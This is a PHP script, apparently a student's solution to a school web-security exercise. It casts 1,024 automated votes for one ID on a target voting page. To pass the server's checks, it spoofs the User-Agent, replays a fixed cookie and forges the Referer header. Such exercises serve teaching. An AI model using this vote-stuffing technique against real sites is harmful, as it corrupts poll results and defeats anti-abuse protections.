/*
 * ===---Description------------------------------------------------------------===
 *   Solution for the Hodor Project, Level 2 by Julien Barbier.
 *   Using PHP through command line.
 *
 *   by Alexandro de Oliveira, for Holberton School
 * ===---Excecuting:-------------------------------------------------------------===
 *   To execute this script just run in the shell:
 *   $ php -f file
 *
 *   So cool!!!
 * ===---------------------------------------------------------------------------===
 */
// Starting...
<?php
$votes = (1 << 10);	// Total amount of desire votes.
$counter = 1;		// Initializing the counter.
$url = 'http://173.246.108.142/level2.php';
$cookie = "c63e8f4583e0fc89436699268e402b6a441281c9";
$data = array('id' => '23', 'holdthedoor' => 'submit', 'key' => $cookie);
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .	//Spliting this long string...
                     "User-Agent: Windows NT 5.1 - (Spoofing the User-Agent) havk64 - PHP Requests\r\n" . //through...
                     "Cookie: HoldTheDoor=" . $cookie . "\r\n" .		// multiple ...
                     "Referer: " . $url . "\r\n",				// lines.
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);

$context  = stream_context_create($options);
for ($i = 0; $i < $votes; $i++) {
        $result = file_get_contents($url, false, $context);
        if($result):
            echo "Vote number: ". $counter++ . "\n";
        else:
            echo "Connection error...(vote not computed)\n";
        endif;
}
echo "\nBOOOOOMMMMMM ! ! !\n\o/ \o/ \o/";
?>
